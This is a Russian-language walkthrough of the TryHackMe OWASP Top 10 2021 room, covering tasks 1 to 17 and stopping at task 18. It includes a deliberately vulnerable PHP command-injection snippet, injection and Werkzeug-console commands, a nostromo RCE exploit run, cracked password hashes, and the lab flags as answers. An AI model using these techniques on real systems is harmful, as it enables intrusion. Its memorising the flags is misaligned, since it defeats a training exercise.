[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [OWASP Top 10 - 2021](https://tryhackme.com/r/room/owasptop102021) 

Всего 23 заданий:
## Задание 1
В этой комнате разбирается каждая тема OWASP и содержатся сведения об уязвимостях, о том, как они возникают, и как их можно эксплуатировать. Вы примените теорию на практике, выполнив вспомогательные задания.

Неисправный контроль доступа
Криптографические сбои
Инъекция
Небезопасный дизайн
Неправильная конфигурация безопасности
Уязвимые и устаревшие компоненты
Ошибки идентификации и аутентификации
Ошибки программного обеспечения и целостности данных
Сбои в ведении журнала безопасности и мониторинге
Подделка запросов на стороне сервера ( SSRF )
Комната рассчитана на новичков и не предполагает никаких предварительных знаний по безопасности.

### Ответьте на вопросы ниже
Прочитайте вышеизложенное.

```commandline
Ответ не нужен
```

## Задание 2
Некоторые задачи потребуют от вас обучения на практике, часто путем взлома виртуальной машины. Сначала давайте запустим виртуальную машину, нажав кнопку Start Machine в верхней части этой задачи.

Чтобы получить доступ к этим машинам, вам нужно либо:

Подключайтесь с помощью OpenVPN
Следуйте инструкциям  здесь,  чтобы подключиться с помощью OpenVPN.
Используйте браузерную машину Linux
Если вы  подписаны , разверните AttackBox в браузере!
### Ответьте на вопросы ниже
Подключитесь к нашей сети или разверните AttackBox.
```commandline
Ответ не нужен
```

## Задание 3
Веб-сайты имеют страницы, которые защищены от обычных посетителей. Например, только администратор сайта должен иметь 
доступ к странице для управления другими пользователями. Если посетитель веб-сайта может получить доступ к 
защищенным страницам, которые он не должен видеть, то контроль доступа нарушен.  

Доступ обычного посетителя к защищенным страницам может привести к следующему:

Возможность просмотра конфиденциальной информации других пользователей
Доступ к несанкционированным функциям
Проще говоря, нарушенный контроль доступа позволяет злоумышленникам обходить авторизацию, что позволяет им 
просматривать конфиденциальные данные или выполнять задачи, которые им не положено.  

Например, в 2019 году была обнаружена уязвимость , когда злоумышленник мог получить любой отдельный кадр из видео на 
Youtube, помеченного как приватное. Исследователь, который обнаружил уязвимость, показал, что он мог запросить 
несколько кадров и в некоторой степени реконструировать видео. Поскольку пользователь, помечая видео как приватное, 
ожидал, что никто не будет иметь к нему доступа, это действительно было принято как уязвимость сломанного контроля 
доступа.   

### Ответьте на вопросы ниже
Прочитайте и поймите, что такое нарушенный контроль доступа.
```commandline
Ответ не нужен
```

## Задание 4
Небезопасная прямая ссылка на объект

IDOR  или Insecure Direct Object Reference относится к уязвимости контроля доступа, где вы можете получить доступ к ресурсам, которые вы обычно не видите. Это происходит, когда программист раскрывает Direct Object Reference, которая является просто идентификатором, ссылающимся на определенные объекты на сервере. Под объектом мы можем подразумевать файл, пользователя, банковский счет в банковском приложении или что угодно.

Например, предположим, что мы входим в свой банковский счет и после правильной аутентификации попадаем на URL-адрес вроде этого  https://bank.thm/account?id=111111. На этой странице мы можем видеть все важные банковские реквизиты, и пользователь может сделать все, что ему нужно, и продолжить свой путь, думая, что все в порядке.



Однако здесь есть потенциально огромная проблема: любой может изменить idпараметр на что-то другое, например 222222, и если сайт настроен неправильно, то у него появится доступ к чужой банковской информации.



Приложение предоставляет прямую ссылку на объект через id параметр в URL, который указывает на определенные учетные 
записи. Поскольку приложение не проверяет, является ли вошедший в систему пользователь владельцем указанной учетной 
записи, злоумышленник может получить конфиденциальную информацию от других пользователей из-за уязвимости IDOR. 
Обратите внимание, что проблема заключается не в прямых ссылках на объекты, а в том, что приложение не проверяет, 
должен ли вошедший в систему пользователь иметь доступ к запрашиваемой учетной записи.

### Ответьте на вопросы ниже
Прочитайте и поймите, как работает IDOR.
```commandline
Ответ не нужен
```
Разверните машину и перейдите по адресу  http://MACHINE_IP - Войдите в систему, используя имя пользователя  noot  и 
пароль  test1234. 
```commandline
Ответ не нужен
```
Посмотрите заметки других пользователей. Что такое флаг?
```commandline
flag{fivefourthree}
```

## Задание 5
Криптографические сбои

Криптографический сбой относится к любой уязвимости, возникающей из-за неправильного использования (или отсутствия использования) криптографических алгоритмов для защиты конфиденциальной информации. Веб-приложениям требуется криптография для обеспечения конфиденциальности для своих пользователей на многих уровнях.

Возьмем, к примеру, защищенное приложение электронной почты:

Когда вы получаете доступ к своей учетной записи электронной почты с помощью браузера, вы хотите быть уверены, что связь между вами и сервером зашифрована. Таким образом, любой перехватчик, пытающийся перехватить ваши сетевые пакеты, не сможет восстановить содержимое ваших адресов электронной почты. Когда мы шифруем сетевой трафик между клиентом и сервером, мы обычно называем это шифрованием данных при передаче .
Поскольку ваши письма хранятся на каком-то сервере, управляемом вашим провайдером, также желательно, чтобы провайдер электронной почты не мог читать письма своих клиентов. С этой целью ваши письма также могут быть зашифрованы при хранении на серверах. Это называется шифрованием данных в состоянии покоя .
Криптографические сбои часто приводят к тому, что веб-приложения случайно разглашают конфиденциальные данные. Часто это данные, напрямую связанные с клиентами (например, имена, даты рождения, финансовая информация), но это может быть и более техническая информация, например, имена пользователей и пароли.

На более сложных уровнях использование некоторых криптографических сбоев часто включает такие методы, как «атаки Man in The Middle», когда злоумышленник принудительно устанавливает соединения пользователей через контролируемое им устройство. Затем он использует слабое шифрование любых передаваемых данных для доступа к перехваченной информации (если данные вообще зашифрованы). Конечно, многие примеры гораздо проще, и уязвимости можно найти в веб-приложениях, которые можно эксплуатировать без глубоких знаний в области сетей. Действительно, в некоторых случаях конфиденциальные данные можно найти непосредственно на самом веб-сервере.

Веб-приложение в этом поле содержит одну такую уязвимость. Чтобы продолжить, прочитайте вспомогательный материал в 
следующих задачах. 

### Ответьте на вопросы ниже
Прочитайте введение в «Криптографические сбои» и разверните машину.
```commandline
Ответ не нужен
```

## Задание 6
Наиболее распространенный способ хранения большого объема данных в формате, легко доступном из многих мест, — это база данных. Это идеально подходит для чего-то вроде веб-приложения, поскольку множество пользователей могут взаимодействовать с веб-сайтом в любое время. Движки баз данных обычно следуют синтаксису языка структурированных запросов ( SQL ).

В производственной среде часто можно увидеть базы данных, настроенные на выделенных серверах, на которых запущена служба базы данных, например MySQL или MariaDB; однако базы данных также могут храниться в виде файлов. Их называют базами данных «плоских файлов», поскольку они хранятся в виде одного файла на компьютере. Это намного проще, чем настраивать целый сервер баз данных, и потенциально может использоваться в небольших веб-приложениях. Доступ к серверу баз данных выходит за рамки сегодняшней задачи, поэтому давайте сосредоточимся на базах данных «плоских файлов».

Как упоминалось ранее, базы данных с плоскими файлами хранятся в виде файла на диске компьютера. Обычно это не будет проблемой для веб-приложения, но что произойдет, если база данных будет храниться в корневом каталоге веб-сайта (т. е. в одном из файлов, доступных пользователю, подключающемуся к веб-сайту)? Ну, мы можем загрузить и запросить ее на нашей собственной машине, имея полный доступ ко всему в базе данных. Действительно, раскрытие конфиденциальных данных!

Это важный намек на задачу, поэтому давайте кратко рассмотрим синтаксис, который мы будем использовать для запросов к базе данных с плоскими файлами.

Наиболее распространенным (и самым простым) форматом базы данных с плоским файлом является база данных SQLite. С ними можно взаимодействовать на большинстве языков программирования, и у них есть специальный клиент для запросов к ним в командной строке. Этот клиент называется sqlite3и устанавливается во многих дистрибутивах Linux по умолчанию.

Предположим, нам удалось успешно загрузить базу данных:

линукс
```commandline
user@linux$ ls -l 
-rw-r--r-- 1 user user 8192 Feb  2 20:33 example.db
                                                                                                                                                              
user@linux$ file example.db 
example.db: SQLite 3.x database, last written using SQLite version 3039002, file counter 1, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 1
```
Мы видим, что в текущей папке находится база данных SQLite.

Для доступа к нему мы используем  sqlite3 <database-name>:

линукс
```commandline
user@linux$ sqlite3 example.db                     
SQLite version 3.39.2 2022-07-21 15:24:47
Enter ".help" for usage hints.
sqlite> 
```
Отсюда мы можем просмотреть таблицы в базе данных, используя  .tables команду:

линукс
```commandline
user@linux$ sqlite3 example.db                     
SQLite version 3.39.2 2022-07-21 15:24:47
Enter ".help" for usage hints.
sqlite> .tables
customers
```
На этом этапе мы можем выгрузить все данные из таблицы, но мы не обязательно узнаем, что означает каждый столбец, пока не посмотрим на информацию в таблице. Сначала давайте используем ,  PRAGMA table_info(customers); чтобы увидеть информацию в таблице. Затем мы используем ,  SELECT * FROM customers; чтобы выгрузить информацию из таблицы:

линукс
```commandline
sqlite> PRAGMA table_info(customers);
0|cudtID|INT|1||1
1|custName|TEXT|1||0
2|creditCard|TEXT|0||0
3|password|TEXT|1||0

sqlite> SELECT * FROM customers;
0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99
1|John Walters|4671 5376 3366 8125|fef08f333cc53594c8097eba1f35726a
2|Lena Abdul|4353 4722 6349 6685|b55ab2470f160c331a99b8d8a1946b19
3|Andrew Miller|4059 8824 0198 5596|bc7b657bd56e4386e3397ca86e378f70
4|Keith Wayman|4972 1604 3381 8885|12e7a36c0710571b3d827992f4cfe679
5|Annett Scholz|5400 1617 6508 1166|e2795fc96af3f4d6288906a90a52a47f
Из информации в таблице видно, что есть четыре столбца: custID, custName, creditCardи password. Вы можете заметить, что это совпадает с результатами. Возьмем первую строку:

0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99
```
 

У нас есть custID (0), custName (Джой Полсон), кредитная карта (4916 9012 2231 7905) и хэш пароля (5f4dcc3b5aa765d61d8327deb882cf99).

В следующем задании мы рассмотрим взлом этого хеша.

### Ответьте на вопросы ниже
Прочитайте и изучите вспомогательные материалы по базам данных SQLite.
```commandline
Ответ не нужен
```

## Задание 7
В предыдущей задаче мы увидели, как запросить базу данных SQLite для конфиденциальных данных. Мы нашли коллекцию хэшей паролей, по одному для каждого пользователя. В этой задаче мы кратко рассмотрим, как их взломать.

Когда дело доходит до взлома хэшей, Kali поставляется с предустановленными различными инструментами. Если вы знаете, как их использовать, то не стесняйтесь делать это; однако они выходят за рамки этого материала.

Вместо этого мы будем использовать онлайн-инструмент:  Crackstation . Этот веб-сайт чрезвычайно хорош для взлома слабых хэшей паролей. Для более сложных хэшей нам понадобятся более сложные инструменты; однако все взламываемые хэши паролей, используемые в сегодняшнем испытании, являются слабыми хэшами MD5 , с которыми Crackstation должен справиться очень хорошо.

При переходе на сайт мы видим следующий интерфейс:

Crackstation

Давайте попробуем вставить хеш пароля для Джой Полсон, который мы нашли в предыдущем задании ( 5f4dcc3b5aa765d61d8327deb882cf99). Решаем капчу, затем нажимаем кнопку «Взломать хеш-коды»:

Взломанный пароль

Мы видим, что хеш был успешно взломан, а пароль пользователя был "password". Как безопасно!

Стоит отметить, что Crackstation работает с использованием огромного списка слов. Если пароль отсутствует в списке слов, то Crackstation не сможет взломать хэш.

Испытание управляемое, поэтому если Crackstation не сможет взломать хеш в сегодняшнем боксе, вы можете предположить, что хеш был специально разработан таким образом, чтобы его нельзя было взломать.

### Ответьте на вопросы ниже
Прочитайте вспомогательные материалы о взломе хэшей.

```commandline
Ответ не нужен
```

## Задание 8
Теперь пришло время применить полученные знания на практике! Для этого задания подключитесь к веб-приложению по адресу  http://MACHINE_IP:81/ .

### Ответьте на вопросы ниже
Посмотрите вокруг веб-приложения. Разработчик оставил себе заметку, указывающую, что в определенном каталоге есть конфиденциальные данные. 

Как называется упомянутый каталог?

```commandline
/assets
```
Перейдите в каталог, который вы нашли в вопросе 1. Какой файл выделяется как файл, который, скорее всего, содержит конфиденциальные данные?

```commandline
webapp.db
```
Используйте вспомогательные материалы для доступа к конфиденциальным данным. Каков хэш пароля пользователя admin?

```commandline
6eea9b7ef19179a06954edd0f6c05ceb
```
Взломать хэш.
Какой открытый пароль администратора?

```commandline
qwertyuiop
```
Войдите как администратор. Что такое флаг?
```commandline
THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}
```

## Задание 9
Инъекция

Ошибки инъекций очень распространены в современных приложениях. Эти ошибки возникают, поскольку приложение интерпретирует контролируемый пользователем ввод как команды или параметры. Атаки инъекций зависят от того, какие технологии используются и как эти технологии интерпретируют ввод. Вот некоторые распространенные примеры:

SQL -инъекция: это происходит, когда контролируемые пользователем входные данные передаются в SQL- запросы. В результате злоумышленник может передавать SQL- запросы, чтобы манипулировать результатами таких запросов. Это может потенциально позволить злоумышленнику получить доступ, изменить и удалить информацию в базе данных, когда эти входные данные передаются в запросы базы данных. Это означает, что злоумышленник может украсть конфиденциальную информацию, такую ​​как личные данные и учетные данные.
Command Injection : это происходит, когда пользовательский ввод передается системным командам. В результате злоумышленник может выполнять произвольные системные команды на серверах приложений, что потенциально позволяет ему получить доступ к системам пользователей.
Основная защита для предотвращения атак инъекций — обеспечение того, чтобы контролируемый пользователем ввод не интерпретировался как запросы или команды. Есть разные способы сделать это:

Использование списка разрешенных: когда ввод отправляется на сервер, этот ввод сравнивается со списком безопасных вводов или символов. Если ввод отмечен как безопасный, то он обрабатывается. В противном случае он отклоняется, и приложение выдает ошибку.
Удаление входных данных: если входные данные содержат опасные символы, они удаляются перед обработкой.
Опасные символы или ввод классифицируются как любой ввод, который может изменить способ обработки базовых данных. Вместо того, чтобы вручную составлять списки разрешений или зачищать ввод, существуют различные библиотеки, которые могут выполнять эти действия за вас.

### Ответьте на вопросы ниже
Я понял, что такое инъекционные атаки.

```commandline
Ответ не нужен
```

## Задание 10
Ввод команды

Внедрение команд происходит, когда серверный код (например, PHP) в веб-приложении вызывает функцию, которая напрямую взаимодействует с консолью сервера. Веб-уязвимость инъекции позволяет злоумышленнику воспользоваться этим вызовом для произвольного выполнения команд операционной системы на сервере. Возможности для злоумышленника отсюда безграничны: он может перечислить файлы, прочитать их содержимое, выполнить некоторые базовые команды для проведения разведки на сервере или сделать что угодно, как если бы он сидел перед сервером и вводил команды непосредственно в командную строку. 

Как только злоумышленник закрепится на веб-сервере, он сможет начать обычный просмотр ваших систем и искать пути обхода.

Пример кода

Давайте рассмотрим сценарий: MooCorp начала разрабатывать веб-приложение для коровьего ASCII-арта с настраиваемым текстом. В поисках способов реализовать свое приложение они наткнулись на cowsayкоманду в Linux, которая делает именно это! Вместо того, чтобы кодировать целое веб-приложение и логику, необходимую для того, чтобы коровы говорили в ASCII, они решили написать простой код, который вызывает команду cowsay из консоли операционной системы и отправляет ее содержимое обратно на веб-сайт.

Давайте посмотрим на код, который они использовали для своего приложения. Попробуйте определить, почему их реализация уязвима для внедрения команд. Мы рассмотрим это ниже.

```commandline
<?php
    if (isset($_GET["mooing"])) {
        $mooing = $_GET["mooing"];
        $cow = 'default';

        if(isset($_GET["cow"]))
            $cow = $_GET["cow"];
        
        passthru("perl /usr/bin/cowsay -f $cow $mooing");
    }
?>
```
Проще говоря, приведенный выше фрагмент делает следующее:

Проверяем, установлен ли параметр "mooing". Если установлен, то переменная $mooingполучает то, что было передано в поле ввода.
Проверяем, установлен ли параметр "корова". Если установлен, то переменная $cowполучает то, что было передано через параметр.
Затем программа выполняет функцию passthru("perl /usr/bin/cowsay -f $cow $mooing");. Функция passthru просто выполняет команду в консоли операционной системы и отправляет вывод обратно в браузер пользователя. Вы можете видеть, что наша команда сформирована путем объединения переменных $cow и $mooing в конце. Поскольку мы можем манипулировать этими переменными, мы можем попробовать внедрить дополнительные команды, используя простые приемы. Если хотите, можете прочитать документацию на passthru()веб -сайте PHP  для получения дополнительной информации о самой функции.
Ввод команды

Использование инъекции команд

Теперь, когда мы знаем, как приложение работает за кулисами, мы воспользуемся функцией bash под названием "inline commands", чтобы злоупотреблять сервером cowsay и выполнять любые произвольные команды, которые мы хотим. Bash позволяет вам запускать команды внутри команд. Это полезно по многим причинам, но в нашем случае это будет использоваться для внедрения команды в сервер cowsay, чтобы она была выполнена.

Для выполнения встроенных команд вам нужно только заключить их в следующий формат  $(your_command_here). Если консоль обнаружит встроенную команду, она сначала выполнит ее, а затем использует результат в качестве параметра для внешней команды. Посмотрите на следующий пример, который выполняется whoamiкак встроенная команда внутри echoкоманды:

Встроенные команды

Итак, возвращаясь к серверу cowsay, вот что произойдет, если мы отправим встроенную команду в веб-приложение:

Отправляем нашу полезную нагрузку

Поскольку приложение принимает от нас любые входные данные, мы можем ввести встроенную команду, которая будет выполнена и использована в качестве параметра для cowsay. Это заставит нашу корову говорить то, что возвращает команда! Если вы не очень хорошо знакомы с Linux , вот несколько других команд, которые вы можете попробовать:

whoami
идентификатор
ifconfig/ip адрес
uname -a
пс -эф
Чтобы ответить на вопросы ниже, перейдите по ссылке http://MACHINE_IP:82/ и эксплуатировать сервер cowsay.

### Ответьте на вопросы ниже
Что за странный текстовый файл находится в корневом каталоге сайта?
```commandline
drpepper.txt
```
Сколько существует пользователей без прав root/не служб/не демонов?
```commandline
0
```
От имени какого пользователя запущено это приложение?
```commandline
apache
```
Какова настройка оболочки пользователя?
```commandline
/sbin/nologin
```
Какая версия Alpine Linux используется?
```commandline
3.16.0
```
## Задание 11
Небезопасный дизайн

Небезопасный дизайн относится к уязвимостям, которые присущи архитектуре приложения. Это не уязвимости, связанные с плохими реализациями или конфигурациями, но идея, лежащая в основе всего приложения (или его части), изначально ошибочна. В большинстве случаев эти уязвимости возникают, когда на этапах планирования приложения выполняется неправильное моделирование угроз, и распространяются вплоть до вашего конечного приложения. В некоторых других случаях уязвимости небезопасного дизайна могут также быть введены разработчиками при добавлении некоторых «ярлыков» вокруг кода для упрощения тестирования. Например, разработчик может отключить проверку OTP на этапах разработки, чтобы быстро протестировать остальную часть приложения без ручного ввода кода при каждом входе в систему, но забыть включить ее снова при отправке приложения в производство.

Небезопасный сброс пароля

Хороший пример такой уязвимости произошел в Instagram некоторое время назад . Instagram позволял пользователям сбрасывать забытые пароли, отправляя им 6-значный код на номер мобильного телефона через SMS для проверки. Если злоумышленник хотел получить доступ к аккаунту жертвы, он мог попытаться подобрать 6-значный код методом перебора. Как и ожидалось, это было невозможно напрямую, поскольку в Instagram было реализовано ограничение скорости, так что после 250 попыток пользователь блокировался от дальнейших попыток.

Код перебора

Однако было обнаружено, что ограничение скорости применяется только к попыткам кодирования, сделанным с одного и того же IP. Если у злоумышленника было несколько разных IP-адресов, с которых он отправлял запросы, он мог  попробовать  250 кодов на IP. Для 6-значного кода у вас есть миллион возможных кодов, поэтому злоумышленнику понадобится 1000000/250 = 4000 IP-адресов, чтобы охватить все возможные коды.  Это может показаться безумным количеством IP-адресов, но облачные сервисы позволяют легко получить их по относительно небольшой цене, что делает эту атаку осуществимой.

Распределенный брутфорс

Обратите внимание, как уязвимость связана с идеей, что ни один пользователь не сможет использовать тысячи IP-адресов для одновременных запросов, чтобы попытаться подобрать числовой код методом подбора. Проблема заключается в дизайне, а не в реализации самого приложения.

Поскольку уязвимости небезопасного дизайна появляются на столь ранней стадии процесса разработки, их устранение часто требует перестройки уязвимой части приложения с нуля и обычно сложнее, чем любая другая простая уязвимость, связанная с кодом. Лучший подход к предотвращению таких уязвимостей — это моделирование угроз на ранних стадиях жизненного цикла разработки. Чтобы получить больше информации о том, как реализовать безопасные жизненные циклы разработки, обязательно посетите комнату SSDLC .

Практический пример

Перейдите по адресу http://MACHINE_IP:85  и войдите в аккаунт Джозефа. Это приложение также имеет недостаток в механизме сброса пароля. Можете ли вы определить слабость предлагаемого дизайна и как его использовать?

### Ответьте на вопросы ниже
Попробуйте сбросить пароль Джозефа. Помните о методе, который использует сайт для проверки того, что вы действительно Джозеф.
```commandline
Ответ не нужен
```
Какова стоимость флага в аккаунте Джозефа?

THM{Not_3ven_c4tz_c0uld_sav3_U!}
```commandline
Ответ не нужен
```

## Задание 12
Неправильная конфигурация безопасности

Ошибочные конфигурации безопасности отличаются от других 10 самых уязвимых мест, поскольку они возникают, когда безопасность могла быть правильно настроена, но не была. Даже если вы загрузите последнее актуальное программное обеспечение, плохие конфигурации могут сделать вашу установку уязвимой.

К неправильным настройкам безопасности относятся:

Плохо настроенные разрешения для облачных сервисов, таких как S3- корзины.
Включение ненужных функций, таких как службы, страницы, учетные записи или привилегии.
Учетные записи по умолчанию с неизмененными паролями.
Сообщения об ошибках слишком подробны и позволяют злоумышленникам узнать больше о системе.
Не используются заголовки безопасности HTTP .
Эта уязвимость часто может приводить к появлению других уязвимостей, таких как учетные данные по умолчанию, дающие вам доступ к конфиденциальным данным, внешним сущностям XML ( XXE ) или внедрению команд на страницах администратора.

Для получения дополнительной информации ознакомьтесь с десяткой самых популярных ошибок в настройке безопасности по версии OWASP .

Отладка интерфейсов

Распространенная ошибка конфигурации безопасности касается раскрытия функций отладки в производственном программном обеспечении. Функции отладки часто доступны в программных фреймворках, чтобы позволить разработчикам получить доступ к расширенным функциям, которые полезны для отладки приложения во время его разработки. Злоумышленники могли бы злоупотреблять некоторыми из этих функций отладки, если бы разработчики каким-то образом забыли отключить их перед публикацией своих приложений.

Один из примеров такой уязвимости предположительно использовался, когда Patreon был взломан в 2015 году . За пять дней до взлома Patreon исследователь безопасности сообщил Patreon, что он нашел открытый отладочный интерфейс для консоли Werkzeug. Werkzeug является важным компонентом в веб-приложениях на основе Python, поскольку он предоставляет интерфейс для веб-серверов для выполнения кода Python. Werkzeug включает в себя отладочную консоль, доступ к которой можно получить либо через URL на /console, либо она также будет представлена ​​пользователю, если приложение вызовет исключение. В обоих случаях консоль предоставляет консоль Python, которая будет запускать любой код, который вы ей отправите. Для злоумышленника это означает, что он может выполнять команды произвольно.

Консоль Werkzeug

Практический пример

Эта виртуальная машина Security Misconfiguration входит в список 10 самых уязвимых мест OWASP .

Перейдите по адресу http://MACHINE_IP:86  и попробуйте воспользоваться неправильной настройкой безопасности, чтобы прочитать исходный код приложения.

### Ответьте на вопросы ниже
Перейдите по адресу http://MACHINE_IP:86/console,  чтобы получить доступ к консоли Werkzeug.
```commandline
Ответ не нужен
```
Используйте консоль Werkzeug для запуска следующего кода Python, который выполнит ls -lкоманду на сервере:

`import os; print(os.popen("ls -l").read())`
Каково имя файла базы данных (с расширением .db) в текущем каталоге?
```commandline
todo.db
```
Измените код для чтения содержимого файла app.py, содержащего  исходный код приложения  . Каково значение переменной secret_flagв исходном коде?
```commandline
THM{Just_a_tiny_misconfiguration}
```

## Задание 13
Уязвимые и устаревшие компоненты

Иногда вы можете обнаружить, что компания/организация, которую вы проверяете на проникновение, использует программу с хорошо известной уязвимостью.

Например, предположим, что компания не обновляла свою версию WordPress несколько лет, и с помощью инструмента, такого как WPScan , вы обнаруживаете, что это версия 4.6. Небольшое быстрое исследование покажет, что WordPress 4.6 уязвим для эксплойта неаутентифицированного удаленного выполнения кода (RCE), и, что еще лучше, вы можете найти эксплойт, уже созданный на  Exploit-DB .

Как вы видите, это было бы довольно разрушительно, поскольку это требует очень мало работы со стороны злоумышленника. Поскольку уязвимость уже хорошо известна, кто-то другой, вероятно, уже сделал эксплойт для уязвимости. Ситуация ухудшается, когда вы понимаете, что это действительно легко сделать. Если компания пропускает одно обновление для используемой ею программы, она может быть уязвима для любого количества атак.

### Ответьте на вопросы ниже
Прочитайте об уязвимости.
```commandline
Ответ не нужен
```

## Задание 14
Напомним, что поскольку речь идет об известных уязвимостях, большая часть работы уже сделана за нас. Наша главная задача — найти информацию о программном обеспечении и исследовать ее, пока мы не найдем эксплойт. Давайте рассмотрим это на примере веб-приложения.

версия Ностромо

Ностромо 1.9.6

Что вы знаете? На этом сервере есть страница по умолчанию для веб-сервера Nostromo. Теперь, когда у нас есть номер версии и название программного обеспечения, мы можем использовать  Exploit-DB,  чтобы попытаться найти эксплойт для этой конкретной версии.

Поиск Exploit-DB

Нам повезло, что верхний результат оказался скриптом-эксплойтом. Давайте скачаем его и попробуем выполнить код. Запуск этого скрипта сам по себе преподает нам очень важный урок.

линукс
```commandline
user@linux$ python 47837.py
Traceback (most recent call last):
  File "47837.py", line 10, in <module>
    cve2019_16278.py
NameError: name 'cve2019_16278' is not defined
```
Эксплойты, которые вы загружаете из Интернета, могут не сработать с первого раза. Полезно понимать язык программирования, на котором написан скрипт, чтобы при необходимости можно было исправить любые ошибки или внести какие-либо изменения, поскольку довольно много скриптов на Exploit-DB ожидают, что вы внесете изменения.

К счастью, ошибка была вызвана строкой, которую следовало закомментировать, так что ее легко исправить.

```commandline
# Exploit Title: nostromo 1.9.6 - Remote Code Execution
# Date: 2019-12-31
# Exploit Author: Kr0ff
# Vendor Homepage:
# Software Link: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz
# Version: 1.9.6
# Tested on: Debian
# CVE : CVE-2019-16278

cve2019_16278.py  # This line needs to be commented.

#!/usr/bin/env python
```
Исправив это, попробуем снова запустить программу.

линукс
```commandline
user@linux$ python2 47837.py 127.0.0.1 80 id


                                        _____-2019-16278
        _____  _______    ______   _____\    \
   _____\    \_\      |  |      | /    / |    |
  /     /|     ||     /  /     /|/    /  /___/|
 /     / /____/||\    \  \    |/|    |__ |___|/
|     | |____|/ \ \    \ |    | |       \
|     |  _____   \|     \|    | |     __/ __
|\     \|\    \   |\         /| |\    \  /  \
| \_____\|    |   | \_______/ | | \____\/    |
| |     /____/|    \ |     | /  | |    |____/|
 \|_____|    ||     \|_____|/    \|____|   | |
        |____|/                        |___|/




HTTP/1.1 200 OK
Date: Fri, 03 Feb 2023 04:58:34 GMT
Server: nostromo 1.9.6
Connection: close

uid=1001(_nostromo) gid=1001(_nostromo) groups=1001(_nostromo)
```
Бум! У нас есть RCE. Теперь важно отметить, что большинство скриптов сообщат вам, какие аргументы вам нужно предоставить. Разработчики эксплойтов редко заставят вас читать потенциально сотни строк кода только для того, чтобы понять, как использовать скрипт.

Стоит также отметить, что это не всегда может быть так просто. Иногда вам просто дадут номер версии, как в этом случае, но в других случаях вам может потребоваться покопаться в исходном коде HTML или даже сделать удачную догадку о скрипте эксплойта. Но реалистично, если это известная уязвимость, вероятно, есть способ узнать, какая версия приложения запущена.

Вот и все. Самое замечательное в этой части OWASP Top 10 то, что работа уже сделана за нас, нам нужно только провести некоторые базовые исследования, и как тестировщик на проникновение вы уже делаете это довольно много.

### Ответьте на вопросы ниже
Прочитайте вышесказанное!
```commandline
Ответ не нужен
```

## Задание 15
Перейдите по адресу  http://MACHINE_IP:84  , где вы найдете уязвимое приложение. Вся информация, необходимая для его эксплуатации, может быть найдена в Интернете. 

### Ответьте на вопросы ниже
Каково содержимое файла /opt/flag.txt?

```commandline
THM{But_1ts_n0t_my_f4ult!}
```
## Задание 16
Аутентификация и управление сеансами являются основными компонентами современных веб-приложений. Аутентификация позволяет пользователям получать доступ к веб-приложениям, проверяя свою личность. Наиболее распространенной формой аутентификации является использование механизма имени пользователя и пароля. Пользователь вводит эти учетные данные, а сервер проверяет их. Затем сервер предоставляет браузеру пользователя сеансовый cookie, если они верны . Сеансовый cookie необходим, поскольку веб-серверы используют HTTP(S) для связи, который не сохраняет состояние. Прикрепление сеансовых cookie означает, что сервер будет знать, кто отправляет какие данные. Затем сервер может отслеживать действия пользователей. 

Если злоумышленник сможет найти недостатки в механизме аутентификации, он может успешно получить доступ к учетным записям других пользователей. Это позволит злоумышленнику получить доступ к конфиденциальным данным (в зависимости от цели приложения). Некоторые распространенные недостатки в механизмах аутентификации включают следующее:

Атаки методом перебора: если веб-приложение использует имена пользователей и пароли, злоумышленник может попытаться запустить атаки методом перебора, которые позволят ему угадать имя пользователя и пароли, используя несколько попыток аутентификации. 
Использование слабых учетных данных:  веб-приложения должны устанавливать надежные политики паролей. Если приложения позволяют пользователям устанавливать пароли, такие как «password1» или общие пароли, злоумышленник может легко угадать их и получить доступ к учетным записям пользователей.
Слабые сеансовые куки: сеансовые куки — это то, как сервер отслеживает пользователей. Если сеансовые куки содержат предсказуемые значения, злоумышленники могут устанавливать свои собственные сеансовые куки и получать доступ к учетным записям пользователей. 
В зависимости от конкретной уязвимости могут быть предусмотрены различные способы смягчения последствий взлома механизмов аутентификации:

Чтобы избежать атак с подбором пароля, убедитесь, что приложение применяет надежную политику паролей. 
Чтобы избежать атак методом подбора, убедитесь, что приложение автоматически блокирует пароли после определенного количества попыток. Это не позволит злоумышленнику проводить больше атак методом подбора.
Внедрите многофакторную аутентификацию. Если у пользователя есть несколько методов аутентификации, например, использование имени пользователя и пароля и получение кода на мобильное устройство, злоумышленнику будет сложно получить и пароль, и код для доступа к учетной записи.
### Ответьте на вопросы ниже
Я понял, как работают сломанные механизмы аутентификации.
```commandline
Ответ не нужен
```

## Задание 17
В этом примере мы рассмотрим логическую ошибку в механизме аутентификации.

Часто случается так, что разработчики забывают дезинфицировать вводимые пользователем данные (имя пользователя и пароль) в коде своего приложения, что может сделать их уязвимыми для атак типа SQL-инъекции. Однако мы сосредоточимся на уязвимости, которая возникает из-за ошибки разработчика, но которую очень легко эксплуатировать, то есть повторная регистрация существующего пользователя.

Давайте разберемся с этим на примере, предположим, что есть существующий пользователь с именем admin, и мы хотим получить доступ к его учетной записи, поэтому мы можем попытаться перерегистрировать это имя пользователя, но с небольшим изменением. Мы введем " admin " без кавычек (обратите внимание на пробел в начале). Теперь, когда вы введете это в поле имени пользователя и введете другую необходимую информацию, такую ​​как идентификатор электронной почты или пароль, и отправите эти данные, это зарегистрирует нового пользователя, но этот пользователь будет иметь те же права, что и учетная запись администратора. Этот новый пользователь также сможет видеть весь контент, представленный под пользователем admin.

Чтобы увидеть это в действии, перейдите по адресу http://MACHINE_IP:8088  и попробуйте зарегистрироваться, используя darrenсвое имя пользователя. Вы увидите, что пользователь уже существует, поэтому попробуйте вместо этого зарегистрировать "darren", и вы увидите, что теперь вы вошли в систему и можете видеть контент, присутствующий только в учетной записи darren, которая в нашем случае является флагом, который вам нужно получить.

### Ответьте на вопросы ниже
Какой флаг вы нашли в аккаунте Даррена?
```commandline
fe86079416a21a3c99937fea8874b667
```
Теперь попробуйте проделать тот же трюк и посмотрите, сможете ли вы войти как  arthur.
```commandline
Ответ не нужен
```
Что за флаг вы нашли в аккаунте Артура?
```commandline
d9ac0f7db4fda460ac3edeb75d75e16e
```

## Задание 18
Что такое честность?

